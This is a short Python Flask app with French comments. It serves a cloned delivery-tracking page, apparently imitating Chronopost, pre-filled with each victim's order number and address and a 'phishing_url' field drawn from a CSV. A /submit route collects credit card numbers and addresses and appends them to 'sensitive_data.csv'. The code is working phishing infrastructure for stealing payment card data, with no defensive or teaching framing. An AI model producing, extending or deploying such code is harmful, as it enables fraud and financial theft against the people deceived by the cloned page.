# pip install flask
import csv
from flask import Flask, render_template, request

app = Flask(__name__)

# Fonction pour récupérer les coordonnées client à partir d'un fichier CSV
def get_client(commande_id):
    with open('clients.csv', 'r', encoding='utf-8') as csv_file:  # Assurez-vous que le fichier clients.csv existe
        reader = csv.DictReader(csv_file)
        for row in reader:
            if row['commande_id'] == commande_id:
                return {
                    'destinataires': row['destinataires'],
                    'adresse': row['adresse'],
                    'commande_id': row['commande_id'],
                    'phishing_url': row['phishing_url']
                }
    return None

# Route principale pour afficher la page avec les coordonnées client
@app.route('/')
def home():
    commande_id = request.args.get('commande_id', '12345')  # Exemple de commande par défaut
    client_data = get_client(commande_id)
    if client_data:
        return render_template('chrono_clone.html', **client_data)
    else:
        return "Commande non trouvée", 404

# Route POST pour sauvegarder les informations sensibles
@app.route('/submit', methods=['POST'])
def submit():
    commande_id = request.form.get('commande_id')
    credit_card = request.form.get('credit_card')
    destinataires = request.form.get('destinataires')
    adresse = request.form.get('adresse')

    # Sauvegarder les informations dans un fichier
    with open('sensitive_data.csv', 'a', encoding='utf-8') as file:
        file.write(f"{commande_id},{credit_card},{destinataires},{adresse}\n")

    return "Données sauvegardées avec succès", 200

if __name__ == '__main__':
    app.run(debug=True)